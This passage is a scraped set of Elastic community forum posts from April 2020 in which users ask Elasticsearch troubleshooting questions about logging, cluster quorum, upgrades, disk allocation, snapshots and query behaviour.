io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:404) ~[?:?] at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:474) ~[?:?] at io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:909) ~[?:?] at java.lang.Thread.run(Thread.java:745) [?:1.8.0_65] [2020-04-21T07:35:13,881][INFO ][o.e.n.Node ] [RogYx45] stopping ... [2020-04-21T07:35:13,889][INFO ][o.e.n.Node ] [RogYx45] stopped [2020-04-21T07:35:13,890][INFO ][o.e.n.Node ] [RogYx45] closing ... [2020-04-21T07:35:13,923][INFO ][o.e.n.Node ] [RogYx45] closed [2020-04-21T07:35:13,928][INFO ][o.e.x.m.p.NativeController] [RogYx45] Native controller process has stopped - no new native processes can be started Can anyone know how to resolve this?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "8f9eb86b-cf41-4b12-adaf-23f4cf779850",
    "url": "https://discuss.elastic.co/t/why-are-elasticsearch-stacktraces-printed-on-newlines-in-json-stdout-logging/228988",
    "title": "Why are elasticsearch stacktraces printed on newlines in JSON/stdout logging?",
    "category": [
      "Elasticsearch"
    ],
    "author": "bbrockway",
    "date": "April 21, 2020, 8:20am",
    "body": "We have our Elasticsearch clusters running in Kubernetes using ECK to manage. Elasticsearch is set up with default logging settings (JSON to stdout). We have a Filebeat DaemonSet scraping /var/log/containers/*.log on each node, which picks up the Elasticsearch logs (as well as those for all our other pods) and sends them back to Elasticsearch to be indexed. Trouble is, even though Elasticsearch is logging in JSON, and even though each line of the stack trace is an element in the \"stacktrace\" array, each element still gets outputted on its own line in stdout, for example: {\"type\": \"server\", \"timestamp\": \"2020-04-21T08:00:15,624Z\", \"level\": \"WARN\", \"component\": \"r.suppressed\", \"cluster.name\": \"elastic-logs\", \"node.name\": \"elasti c-logs-es-data1-1\", \"message\": \"path: /elastalert_status/_search, params: {size=1, index=elastalert_status, _source_includes=endtime,rule_name}\", \"cluster.uui d\": \"qWZni4INRtqbaExhnXD4eA\", \"node.id\": \"DIjWMm9vRjaYaV4SItWSkw\" , \"stacktrace\": [\"org.elasticsearch.action.search.SearchPhaseExecutionException: all shards failed\", \"at org.elasticsearch.action.search.AbstractSearchAsyncAction.onPhaseFailure(AbstractSearchAsyncAction.java:534) [elasticsearch-7.5.2.jar:7.5.2]\", \"at org.elasticsearch.action.search.AbstractSearchAsyncAction.executeNextPhase(AbstractSearchAsyncAction.java:305) [elasticsearch-7.5.2.jar:7.5.2]\", \"at org.elasticsearch.action.search.AbstractSearchAsyncAction.onPhaseDone(AbstractSearchAsyncAction.java:563) [elasticsearch-7.5.2.jar:7.5.2]\", \"at org.elasticsearch.action.search.AbstractSearchAsyncAction.onShardFailure(AbstractSearchAsyncAction.java:384) [elasticsearch-7.5.2.jar:7.5.2]\", \"at org.elasticsearch.action.search.AbstractSearchAsyncAction.lambda$performPhaseOnShard$0(AbstractSearchAsyncAction.java:219) [elasticsearch-7.5.2.jar:7.5.2]\", \"at org.elasticsearch.action.search.AbstractSearchAsyncAction$2.doRun(AbstractSearchAsyncAction.java:284) [elasticsearch-7.5.2.jar:7.5.2]\", \"at org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37) [elasticsearch-7.5.2.jar:7.5.2]\", \"at org.elasticsearch.common.util.concurrent.TimedRunnable.doRun(TimedRunnable.java:44) [elasticsearch-7.5.2.jar:7.5.2]\", \"at org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingAbstractRunnable.doRun(ThreadContext.java:773) [elasticsearch-7.5.2.jar:7.5.2]\", \"at org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37) [elasticsearch-7.5.2.jar:7.5.2]\", \"at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) [?:?]\", \"at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) [?:?]\", \"at java.lang.Thread.run(Thread.java:830) [?:?]\"] } ...so Filebeat doesn't pick the whole thing up as a single event. We can leverage the multiline function to get around this but shouldn't it be logging it all on one line anyway?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "c24f8872-dbe9-41e5-bcda-5a1e86455b3c",
    "url": "https://discuss.elastic.co/t/group-by-multiple-fields-and-aggregate/228989",
    "title": "Group by multiple fields and aggregate",
    "category": [
      "Elasticsearch"
    ],
    "author": "Tim25659",
    "date": "April 21, 2020, 8:15am",
    "body": "Hi, I'm trying a lot but not getting the exact result please guide me as i'm new to elastic search. stackoverflow.com Group by multiple fields and aggregate elasticsearch, elastic-stack, elasticsearch-aggregation, resthighlevelclient asked by tim12 h on 07:14AM - 21 Apr 20 UTC Thanks",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "5fc8429a-2d2e-4b20-bc38-6c47aeeeb131",
    "url": "https://discuss.elastic.co/t/when-i-use-javaapi-to-query-es-there-is-no-data-hit-how-to-get-the-request-parameter-value-during-query-in-the-return-value-response/228984",
    "title": "When I use JavaAPI to query ES, there is no data hit, how to get the request parameter value during query in the return value response?",
    "category": [
      "Elasticsearch"
    ],
    "author": "chenk",
    "date": "April 21, 2020, 7:59am",
    "body": "ES version 7.3.2, Java1.8, spark 2.3.0 Problem Description: hey all, I have a problem, the project needs to use spark streaming to consume Kafka data in real time and query the consumed data for ES. For data that is not queried in ES, it needs to be pushed to another topic of Kafka. Because the amount of data consumed by spark streaming from kafka is relatively large, ES is used. MultiSearchRequest to encapsulate a series of query requests, the problem is that after executing msearch, there is no way to know which query request parameter missed the data in the MultiSearchResponse returned from the ES. The simple description is that 1000 request queries are now packaged as batch queries. Among them, 100 query miss data, you need to know the request parameters of these 100 queries based on the return value, you need to know the original Kafka data according to the request parameters, and then Push raw data to another topic. Anyone who knows the solution or someone who has ideas is in trouble. Thank you very much! Please let me know if you need more information from my side. Any help will be appreciated. Regards, chenk",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "00abeac9-7adb-42cf-94f9-3c5de33fc68e",
    "url": "https://discuss.elastic.co/t/elasticsearch-to-aws/228979",
    "title": "Elasticsearch to aws",
    "category": [
      "Elasticsearch"
    ],
    "author": "John_Carlo",
    "date": "April 21, 2020, 7:16am April 21, 2020, 7:30am April 21, 2020, 7:39am April 21, 2020, 7:49am April 21, 2020, 7:54am",
    "body": "Hi Everyone. im new to this technology. since last week ive been trying to setup or connect my elasticsearch AWS to my local elasticsearch. i downloaded elasticsearch 7.6.2 and kibana 7.6.2 version to my local and setup all the default. i tried to connect with http://localhost:9200/http:localhost:5601 (they're working). now we have elasticsearch setup from AWS. i want to connect that aws ES to this elasticsearch on my local. could please tell me how? thank you i have already tried to edit the elasticsearch.yml. here is my settings. but this one cannot connect or start the elasticsearch service on my mac # ======================== Elasticsearch Configuration ========================= # # NOTE: Elasticsearch comes with reasonable defaults for most settings. # Before you set out to tweak and tune the configuration, make sure you # understand what are you trying to accomplish and the consequences. # # The primary way of configuring a node is via this file. This template lists # the most important settings you may want to configure for a production cluster. # # Please consult the documentation for further information on configuration options: # https://www.elastic.co/guide/en/elasticsearch/reference/index.html # # ---------------------------------- Cluster ----------------------------------- # # Use a descriptive name for your cluster: # cluster.name: Dev-ES # # ------------------------------------ Node ------------------------------------ # # Use a descriptive name for the node: # #node.name: node-1 node.master: true node.data: true # # Add custom attributes to the node: # #node.attr.rack: r1 # # ----------------------------------- Paths ------------------------------------ # # Path to directory where to store the data (separate multiple locations by comma): # #path.data: /path/to/data # # Path to log files: # #path.logs: /path/to/logs # # ----------------------------------- Memory ----------------------------------- # # Lock the memory on startup: # #bootstrap.memory_lock: true # # Make sure that the heap size is set to about half the memory available # on the system and that the owner of the process is allowed to use this # limit. # # Elasticsearch performs poorly when the system is swapping the memory. # # ---------------------------------- Network ----------------------------------- # # Set the bind address to a specific IP (IPv4 or IPv6): # #network.host: 192.168.0.1 network.host: **.***.***.*** # # Set a custom port for HTTP: #Set a custom port for HTTP: http://es.host.net:5601 # #transport.tcp.port: 9300 http.port: 9200 #http.port: 5601 # # For more information, consult the network module documentation. # # --------------------------------- Discovery ---------------------------------- # # Pass an initial list of hosts to perform discovery when this node is started: # The default list of hosts is [\"127.0.0.1\", \"[::1]\"] # #discovery.seed_hosts: [\"host1\", \"host2\"] #discovery.seed_hosts: [\"es.host.net\", \"[::1]\"] discovery.zen.ping.unicast.hosts: [\"**.**.***.***\"] # # Bootstrap the cluster using an initial set of master-eligible nodes: # #cluster.initial_master_nodes: [\"node-1\", \"node-2\"] # # For more information, consult the discovery and cluster formation module documentation. # # ---------------------------------- Gateway ----------------------------------- # # Block initial recovery after a full cluster restart until N nodes are started: # #gateway.recover_after_nodes: 3 # # For more information, consult the gateway module documentation. # # ---------------------------------- Various ----------------------------------- # # Require explicit names when deleting indices: # #action.destructive_requires_name: true",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "174b7a0f-c0d2-48d5-bc23-62075f6b8bb3",
    "url": "https://discuss.elastic.co/t/span-multi-wildcard-query-determining-max-clause-count-value/227785",
    "title": "Span_multi wildcard query: determining max clause count value",
    "category": [
      "Elasticsearch"
    ],
    "author": "rhar",
    "date": "April 13, 2020, 3:06pm April 14, 2020, 4:49pm April 15, 2020, 9:56am April 17, 2020, 4:24pm April 21, 2020, 7:53am",
    "body": "Hi, We are hitting the max clause count exceeded exception for the wildcard span_multi queries. While the exception indicates the clause count has exceeded threshold (1024). It does not tell what was the actual clause count. In lack of this information, how do you optimize the indices.query.bool.max_clause_count setting? Besides, the documentation says setting a \"higher value can lead to performance degradations and memory issues, especially in clusters with a high load or few resources.\". I suppose this also depends on the resource dedicated to the cluster. So what is the best way to test & benchmark the performance of cluster to determine at what max_clause_count setting value the specific cluster performance is degrading? Thanks",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "2a47d98d-ce06-4f50-8363-008ba48e1d0c",
    "url": "https://discuss.elastic.co/t/date-in-index-name-doesnt-change-on-rollover-on-the-next-day/226701",
    "title": "Date in index name doesn't change on rollover on the next day",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 6, 2020, 11:53am April 13, 2020, 10:08pm April 14, 2020, 6:54am April 14, 2020, 3:05pm April 15, 2020, 6:27am April 21, 2020, 7:41am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "0ad1f4f2-f6d2-49b5-8f2e-69a86fb85b2b",
    "url": "https://discuss.elastic.co/t/elasticsearch-7-apt-repository-hash-sum-mismatch/226365",
    "title": "ElasticSearch 7 APT repository - hash sum mismatch",
    "category": [
      "Elasticsearch"
    ],
    "author": "JYG_NAOS",
    "date": "April 3, 2020, 8:28am April 3, 2020, 2:54pm April 7, 2020, 8:47am April 17, 2020, 5:07pm April 17, 2020, 6:26pm April 17, 2020, 6:41pm April 21, 2020, 7:21am",
    "body": "Hello, Since 31th March 2020, install from https://artifacts.elastic.co/packages/7.x/apt stable/main amd64 elasticsearch amd64 7.6.2 doesn't work because of hash sum mismatch. Problem is for multiple DEB packets. I tested 'elasticsearch' and 'kibana' on fresh Debian 10 install. Example for 'elasticsearch' : Hashes of expected file: SHA512:5a86d49bc184bea4f73380bc95633d60439af6d4152605c12f5b1edb251593e1fe22af91595498708bc66890b4b6dcd283397736a2ecfce32ccbbbb3ee38ce19 SHA256:6ef2b0ed7844ed70d739216570b9479642b962c0e042ce24a02af0e3f5f6ced8 SHA1:af0d8f036640c12faad0f1b99a9c36fee22b2e78 [weak] MD5Sum:91eac9aa06272ab6a6cfbf2e14ccea6c [weak] Filesize:296520940 [weak] Hashes of received file: SHA512:83c90f3bacb4e4961c7c5f2fa95f6733b510bd7da3141ed5c71c5a2ff0bb533e2e5eb4b2e8772638c25d32dda0b30b13515ba961959bd8dd91333e88b71e75bd SHA256:97ba4c1ec3936e9b55203e52ed711c2764641cf69893d40d41e4c8d42a0fe44c SHA1:c80efc831cc361c551b76480c14891c385123b3d [weak] MD5Sum:dd0b38cf6fe7f1e99864cf4f23fba577 [weak] Filesize:296520940 [weak] Last modification reported: Tue, 31 Mar 2020 15:29:22 +0000 I tried multiple update from apt but hash are always the same. Is there a problem with repository ? Thanks in advance for your help.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "da625819-6da0-4045-81bd-bea00fa349e0",
    "url": "https://discuss.elastic.co/t/sigterm-on-master-nodes/228904",
    "title": "SIGTERM on master nodes",
    "category": [
      "Elasticsearch"
    ],
    "author": "tetiana",
    "date": "April 20, 2020, 4:41pm April 21, 2020, 6:27am April 21, 2020, 6:29am April 21, 2020, 7:20am",
    "body": "Hello, during the ES upgrade from version 7.2.1 to 7.3.2, I got: { \"root_cause\" : [ { \"type\" : \"master_not_discovered_exception\", \"reason\" : null } ], \"type\" : \"master_not_discovered_exception\", \"reason\" : null } for each master reelection (3 master nodes) From the logs, I see that the master election was started after the active master stopped by both left master nodes in about the same time. Is it expected behavior that SIGTERM to an active master do not waits for a new master to be re-elected before the Elasticsearch process exits ? What is the recommended way to handle that?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "acda62ae-db24-4ac7-b64d-0b41b89ef82f",
    "url": "https://discuss.elastic.co/t/7-3-1-after-upgrading-to-7-6-2-the-cluster-master-freezes-irregularly/228975",
    "title": "7.3.1 After upgrading to 7.6.2, the cluster master freezes irregularly",
    "category": [
      "Elasticsearch"
    ],
    "author": "zcola",
    "date": "April 21, 2020, 6:43am April 21, 2020, 6:45am",
    "body": "github.com/elastic/elasticsearch 7.3.1 After upgrading to 7.6.2, the cluster master freezes irregularly opened 09:08AM - 10 Apr 20 UTC closed 09:55AM - 10 Apr 20 UTC zcola Describe the feature: Elasticsearch version (bin/elasticsearch --version): 7.6.2 Plugins installed: [] IK JVM version (java -version): 13 OS version (uname -a if on a Unix-like system): Debian 8 Description of...",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "7bda6358-6f63-487b-8da8-603fda1d7e14",
    "url": "https://discuss.elastic.co/t/issue-with-query-string-query/228967",
    "title": "Issue with Query string query",
    "category": [
      "Elasticsearch"
    ],
    "author": "MKU",
    "date": "April 21, 2020, 5:58am April 21, 2020, 6:43am",
    "body": "Hi all, I am using query string query to evaluate a boolean expression. Here is my query, { \"query\": { \"query_string\" : { \"query\" : \"((A=User) AND((B=rsana) OR(C=rsana)OR(D=rsana)))\", \"analyze_wildcard\":true } } } The above query is giving undesired results, it is suppose to give fields with rsana substring in it. instead it gives me all records with any of these alphabets in it \"r\",\"s\",\"a\",\"n\". And if i use *rsana*, that is if i use wild cards, i get no results. Does any one have idea about this. Regards, Mohan",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f8c4c94e-1f7e-46f1-980a-e8397e928a91",
    "url": "https://discuss.elastic.co/t/elasticsearch-does-not-use-all-path-data/228905",
    "title": "Elasticsearch does not use all path.data",
    "category": [
      "Elasticsearch"
    ],
    "author": "mobidyc",
    "date": "April 20, 2020, 4:45pm April 21, 2020, 6:06am April 21, 2020, 6:24am",
    "body": "Good morning guys, I setup multiple path.data but when I check the disk usage, the repartition seems wrong. [root@cld0286su ssd9]# grep path.data /etc/elasticsearch/elasticsearch.yml path.data: /srv/ssd1/elasticsearch,/srv/ssd2/elasticsearch,/srv/ssd3/elasticsearch,/srv/ssd4/elasticsearch,/srv/ssd5/elasticsearch,/srv/ssd6/elasticsearch,/srv/ssd7/elasticsearch,/srv/ssd8/elasticsearch,/srv/ssd9/elasticsearch [root@cld0286su ssd9]# du -hs /srv/ssd*/elasticsearch/ 664K /srv/ssd1/elasticsearch/ 664K /srv/ssd2/elasticsearch/ 664K /srv/ssd3/elasticsearch/ 4,6G /srv/ssd4/elasticsearch/ 664K /srv/ssd5/elasticsearch/ 664K /srv/ssd6/elasticsearch/ 780K /srv/ssd7/elasticsearch/ 664K /srv/ssd8/elasticsearch/ 56G /srv/ssd9/elasticsearch/ [root@cld0286su ssd9]# Of course I checked the number of shards (and size) to be sure the everything does not belong to the same shard [root@cld0286su ssd9]# curl -s 127.0.0.1:9200/_cat/shards |grep cld0286su |wc -l 48 [root@cld0286su ssd9]# [root@cld0286su ssd9]# curl -s 127.0.0.1:9200/_cat/shards |grep cld0286su |grep gb stats-disk-2020.04-archive 0 r STARTED 7956473 1.5gb 10.160.186.91 cld0286su stats-disk-2019.11-archive 4 p STARTED 22652670 4.5gb 10.160.186.91 cld0286su stats-disk-2020.04.11 3 r STARTED 24827005 4.9gb 10.160.186.91 cld0286su stats-disk-2020.04.18 0 p STARTED 24328432 4.9gb 10.160.186.91 cld0286su stats-disk-2020.04.06 2 r STARTED 25472127 5.2gb 10.160.186.91 cld0286su stats-disk-2019.12-archive 3 r STARTED 23155079 4.7gb 10.160.186.91 cld0286su stats-disk-2020.03-archive 2 r STARTED 25373517 5.1gb 10.160.186.91 cld0286su stats-disk-2019.10-archive 11 r STARTED 23814628 4.7gb 10.160.186.91 cld0286su stats-disk-2020.04.15 0 p STARTED 25351113 5.1gb 10.160.186.91 cld0286su stats-disk-2019.08-archive 7 r STARTED 23253432 4.7gb 10.160.186.91 cld0286su stats-disk-2020.01-archive 8 p STARTED 23153243 4.6gb 10.160.186.91 cld0286su stats-disk-2020.02-archive 5 r STARTED 22064042 4.3gb 10.160.186.91 cld0286su [root@cld0286su ssd9]# [root@cld0286su ssd9]# df -h ../ssd* Filesystem Size Used Avail Use% Mounted on /dev/sdak 184G 130G 54G 71% /srv/ssd1 /dev/sdal 184G 161G 23G 88% /srv/ssd2 /dev/sdam 184G 142G 42G 78% /srv/ssd3 /dev/sdan 184G 108G 76G 59% /srv/ssd4 /dev/sdao 184G 127G 57G 70% /srv/ssd5 /dev/sdap 184G 130G 54G 71% /srv/ssd6 /dev/sdaq 184G 113G 71G 62% /srv/ssd7 /dev/sdar 184G 120G 65G 65% /srv/ssd8 /dev/sdbg 373G 156G 218G 42% /srv/ssd9 [root@cld0286su ssd9]# Configuration is the following: [root@cld0286su ssd9]# cat /etc/elasticsearch/elasticsearch.yml bootstrap.system_call_filter: false # requires kernel 3.5+ with CONFIG_SECCOMP and CONFIG_SECCOMP_FILTER compiled in cluster.name: MyCluster cluster.routing.allocation.disk.watermark.flood_stage: \"99%\" cluster.routing.allocation.disk.watermark.high: \"94%\" cluster.routing.allocation.disk.watermark.low: \"90%\" discovery.zen.minimum_master_nodes: 26 discovery.zen.ping.unicast.hosts: ['xxx'] http.cors.allow-origin: \"*\" http.cors.enabled: true network.bind_host: ['xxx'] network.publish_host: 10.160.186.91 node.data: True node.master: False node.name: cld0286su path.data: /srv/ssd1/elasticsearch,/srv/ssd2/elasticsearch,/srv/ssd3/elasticsearch,/srv/ssd4/elasticsearch,/srv/ssd5/elasticsearch,/srv/ssd6/elasticsearch,/srv/ssd7/elasticsearch,/srv/ssd8/elasticsearch,/srv/ssd9/elasticsearch path.logs: /data/logs/elasticsearch/ reindex.remote.whitelist: \"*:9200, *:9201\" xpack.security.enabled: false xpack.monitoring.enabled: true xpack.monitoring.elasticsearch.collection.enabled: true discovery.zen.fd.ping_interval: 1s discovery.zen.fd.ping_timeout: 2s discovery.zen.fd.ping_retries: 3 [root@cld0286su ssd9]# I do not see what could be wrong in the disk allocator configuration, cluster is stable and almost never has relocations. Is there a way to move shards to a specific disk? Maybe by stopping the node, moving the shard folder and restart the service (but it would be a pain as I have around 50 servers in the same situation) ? Any help appreciated",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "670e2ac9-e5c9-48d4-8602-2dd217720d82",
    "url": "https://discuss.elastic.co/t/force-update-in-elastic-search-using-update-by-query-without-version-check/228843",
    "title": "Force update in elastic search using update_by_query without version check",
    "category": [
      "Elasticsearch"
    ],
    "author": "Shashank_Sharma",
    "date": "April 21, 2020, 6:02am",
    "body": "I am getting a version mismatch error in elasticsearch update. But I want to update using my query whether in between select and update there is some change in database or not. POST /alias_3/_doc/_update_by_query?retry_on_conflict=5 { \"query\": { \"bool\": { \"filter\": { \"bool\": { \"must\": [{\"terms\":{\"id\":[2,3]}}] } } } }, \"script\": { \"inline\":\"ctx._source.flag=0\", \"lang\": \"painless\" } } The above query is showing the following error - contains unrecognized parameter: [retry_on_conflict].",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "23444256-d4ae-4133-b23f-4b7037ed0e0f",
    "url": "https://discuss.elastic.co/t/update-mapping-from-text-to-text-keyword/228908",
    "title": "Update mapping from text to text.keyword",
    "category": [
      "Elasticsearch"
    ],
    "author": "Hari_Krishnan",
    "date": "April 20, 2020, 5:34pm April 20, 2020, 7:51pm April 21, 2020, 2:54am April 21, 2020, 6:02am",
    "body": "Hello all, I have my elasticsearch with 100gb of data and now I’m trying to add keyword for one field . So is it possible to update the mapping without reindexing the date if keyword is not there for particular field I couldn’t not apply visualization",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "bada2db3-8287-4522-b6d7-3dbf21ddb360",
    "url": "https://discuss.elastic.co/t/winlobeat-not-able-to-send-cloud-instance-id-fields-or-cloud-fields-into-siem-elasticsearch/228447",
    "title": "Winlobeat not able to send cloud.instance.id fields or cloud fields into SIEM Elasticsearch",
    "category": [
      "Elasticsearch"
    ],
    "author": "Gaurav_Rathi",
    "date": "April 17, 2020, 4:54am April 21, 2020, 5:42am",
    "body": "Winlobeat not able to send cloud.instance.id fields or cloud fields into SIEM Elasticsearch Winlogbeat version 7.6.0 No cloud fields are appearing in Elasticsearch but other fields like agent,event,host,winlog are appearing. I need cloud fields to fetch instance ID on which Winlogbeat has been installed and furthur automation is applied on this. So this breaks my automation process. Please help here. @andrewkroh",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "1b4a29c8-2132-4f9d-a4d7-b9d2996d5bd1",
    "url": "https://discuss.elastic.co/t/managing-loss-of-master-quorum-from-simultaneous-restart-of-nodes/225112",
    "title": "Managing loss of master quorum from simultaneous restart of nodes",
    "category": [
      "Elasticsearch"
    ],
    "author": "Dandy",
    "date": "March 26, 2020, 5:13am March 26, 2020, 7:18am March 26, 2020, 7:23am March 26, 2020, 7:58am March 26, 2020, 9:57am March 26, 2020, 10:49am April 21, 2020, 4:51am",
    "body": "Similar in nature to this: Handling loss of master quorum in ES7+ Elasticsearch I am planning to upgrade an ES 6.3 cluster to 7.2 soon. In ES 6.3 if we lose a quorum of master nodes we can bring up new nodes which will join the cluster and regain quorum, but after ES 7 new master nodes cannot join a cluster which does not have quorum and the cluster will thus be permanently impaired. While we never kill more than one node at a time, we would still like to handle a loss of master quorum due to any unforeseen circumstances or hardware issues, and without bringing up a new clu… In 7.X I have a scenario where the quorum is lost due to a restart of all the nodes at the same time. All the data is still present, so cluster state is OK. What's the solution to working around this? I have masters constantly trying to connect to each other but failing: [2020-03-26T05:08:41,583][INFO ][o.e.c.c.JoinHelper ] [elasticsearch-es-master-1] failed to join {elasticsearch-es-master-1}{KG71sIO_TAOPHDCnwVdxRw}{8r3SI6OlRPKF3jfr5A81zw}{10.244.21.61}{10.244.21.61:9300}{box_type=hot} with JoinRequest{sourceNode={elasticsearch-es-master-1}{KG71sIO_TAOPHDCnwVdxRw}{8r3SI6OlRPKF3jfr5A81zw}{10.244.21.61}{10.244.21.61:9300}{box_type=hot}, optionalJoin=Optional[Join{term=94, lastAcceptedTerm=93, lastAcceptedVersion=5099765, sourceNode={elasticsearch-es-master-1}{KG71sIO_TAOPHDCnwVdxRw}{8r3SI6OlRPKF3jfr5A81zw}{10.244.21.61}{10.244.21.61:9300}{box_type=hot}, targetNode={elasticsearch-es-master-1}{KG71sIO_TAOPHDCnwVdxRw}{8r3SI6OlRPKF3jfr5A81zw}{10.244.21.61}{10.244.21.61:9300}{box_type=hot}}]} org.elasticsearch.transport.RemoteTransportException: [elasticsearch-es-master-1][10.244.21.61:9300][internal:cluster/coordination/join] Caused by: org.elasticsearch.cluster.coordination.FailedToCommitClusterStateException: node is no longer master for term 95 while handling publication at org.elasticsearch.cluster.coordination.Coordinator.publish(Coordinator.java:1012) ~[elasticsearch-7.2.0.jar:7.2.0] at org.elasticsearch.cluster.service.MasterService.publish(MasterService.java:252) [elasticsearch-7.2.0.jar:7.2.0] at org.elasticsearch.cluster.service.MasterService.runTasks(MasterService.java:238) [elasticsearch-7.2.0.jar:7.2.0] at org.elasticsearch.cluster.service.MasterService$Batcher.run(MasterService.java:142) [elasticsearch-7.2.0.jar:7.2.0] at org.elasticsearch.cluster.service.TaskBatcher.runIfNotProcessed(TaskBatcher.java:150) [elasticsearch-7.2.0.jar:7.2.0] at org.elasticsearch.cluster.service.TaskBatcher$BatchedTask.run(TaskBatcher.java:188) [elasticsearch-7.2.0.jar:7.2.0] It seems they can't establish quorum and appear to be all over the place right now.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "b28843ad-6043-4d1e-9df0-06cbcd3fd8cb",
    "url": "https://discuss.elastic.co/t/error-repository-verification-exception/227238",
    "title": "Error repository verification exception",
    "category": [
      "Elasticsearch"
    ],
    "author": "Fourir_Akbar",
    "date": "April 9, 2020, 9:22am April 9, 2020, 9:43am April 9, 2020, 2:22pm April 9, 2020, 2:28pm April 13, 2020, 3:27am April 20, 2020, 10:36am April 20, 2020, 11:07am April 21, 2020, 4:48am",
    "body": "Hi there, I use Elasticsearch 6.x I follow this tutorial: https://badshah.io/backup-and-restore-elasticsearch-cluster-using-gcs/ But I got an error repository_verification_exception After I create a repository { \"error\": { \"root_cause\": [ { \"type\": \"repository_verification_exception\", \"reason\": \"[backup] [[Z_bopU6OSbuJZnTYUewk_Q, 'RemoteTransportException[[hostname1][IP_ES:9300][internal:admin/repository/verify]]; nested: RepositoryMissingException[[backup] missing];']]\" } ], \"type\": \"repository_verification_exception\", \"reason\": \"[backup] [[Z_bopU6OSbuJZnTYUewk_Q, 'RemoteTransportException[[hostname1][IP_ES:9300][internal:admin/repository/verify]]; nested: RepositoryMissingException[[backup] missing];']]\" }, \"status\": 500 } Command that I use to create repository curl -X PUT -H \"Content-Type: application/json\" -d '{\"type\": \"gcs\", \"settings\": {\"bucket\": \"backup_elastic\", \"base_path\": \"es-backup\"} }' localhost:9200/_snapshot/backup I already search in google for this error, but I still I can't find the answer. Maybe someone in here can help me. Thanks!",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "fe99fc4c-729e-4b87-850d-dea3db868556",
    "url": "https://discuss.elastic.co/t/mtermvectors-api-not-working-properly/228702",
    "title": "Mtermvectors API not working properly",
    "category": [
      "Elasticsearch"
    ],
    "author": "Thek10patil",
    "date": "April 19, 2020, 6:05am April 20, 2020, 11:28pm April 20, 2020, 11:41pm April 20, 2020, 11:43pm April 21, 2020, 12:31am April 21, 2020, 12:51am April 21, 2020, 2:52am April 21, 2020, 4:24am",
    "body": "Hi Team, Currently, I am using Elasticsearch for my journal data in my Research lab. I am trying to retrieve mtermvectors for 25 documents at a time using python. Some times I get the result properly but most of the times I am getting error \"Undecodable raw error response from the server: No JSON object could be decoded\" I am not able to figure out why I am getting this error some times and other times I am getting expected result with the same HTTP request. Example HTTP request which works some times and gives error most of the times: http://servername/elastic/indexname/article/_mtermvectors?offsets=false&fields=plain_text&ids=85183%2C85190%2C85191%2C85194%2C85196%2C85197%2C85198%2C85203%2C85207%2C85211%2C85214%2C85230%2C85244%2C85252%2C85267%2C85269%2C85275%2C85279%2C85280%2C85284%2C85296%2C83702%2C83704%2C83707%2C83720&field_statistics=false&term_statistics=true&payloads=false&positions=false&realtime=false Any help would be appreciated.",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "1a2aec46-ef86-44c0-8adc-de9e77c49877",
    "url": "https://discuss.elastic.co/t/elastic-watcher-does-not-execute-for-a-long-time/228950",
    "title": "Elastic Watcher does not execute for a long time",
    "category": [
      "Elasticsearch"
    ],
    "author": "Jack_Phan",
    "date": "April 21, 2020, 3:56am",
    "body": "I have a watcher that executes every 1 minute. Yesterday, I received an alert from the Watcher and checked if anything wrong. Then I figured out that the watcher didn't execute for 12 hours (5pm-5am). And the first execution triggered an alert. Screen Shot 2020-04-21 at 10.41.18 AM2880×1526 326 KB However, when I run the scripts defined in the watcher in DevTools, filtered with the same time, I didn't see anything wrong. Screen Shot 2020-04-21 at 10.46.58 AM2770×1258 342 KB For more information, the watcher will trigger alerts when aggregations.count.value < 0. The error in the execution history is due to timeout since the ES cluster is probably overloaded at that time.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "eaf6bc3d-7648-48cb-ba92-2e41b46a7b65",
    "url": "https://discuss.elastic.co/t/unexpected-behaviour-of-termvector-api-in-python/228948",
    "title": "Unexpected behaviour of termvector API in Python",
    "category": [
      "Elasticsearch"
    ],
    "author": "Thek10patil",
    "date": "April 21, 2020, 2:49am",
    "body": "I am currently working on Elasticsearch with a huge number of documents(around 500K) in an index. I want to store n-grams of each document's text data(This is also huge ~ per doc contains 2 pages of text data) in another index. So I calculating term vectors and their count in each document to store them in the new index. So I can execute aggregation queries on the new Index. The setting of the old index has enabled me to execute termvector and mtermvector API's. Due Elasticsearch server timeout issue most of the times mtermvectors API throwing Proxy error. Some times I am getting expected response but most of the times I am getting the following error: Proxy Error The proxy server received an invalid response from an upstream server. The proxy server could not handle the request GET /elastic/*indexname*/article/_mtermvectors. Reason: Error reading from remote server Sample mtermvector HTTP URL after calling mtermvector API in python http://*servername*/elastic/*indexname*/article/_mtermvectors?offsets=false&fields=plain_text&ids=608467%2C608469%2C608473%2C608475%2C608477%2C608482%2C608485%2C608492%2C608498%2C608504%2C608509%2C608511%2C608520%2C608522%2C608528%2C608530%2C608541%2C608549%2C608562%2C608570%2C608573%2C608576%2C608577%2C608579%2C608585&field_statistics=true&term_statistics=true&payloads=false&positions=false That's why I decided to use Termvector API. 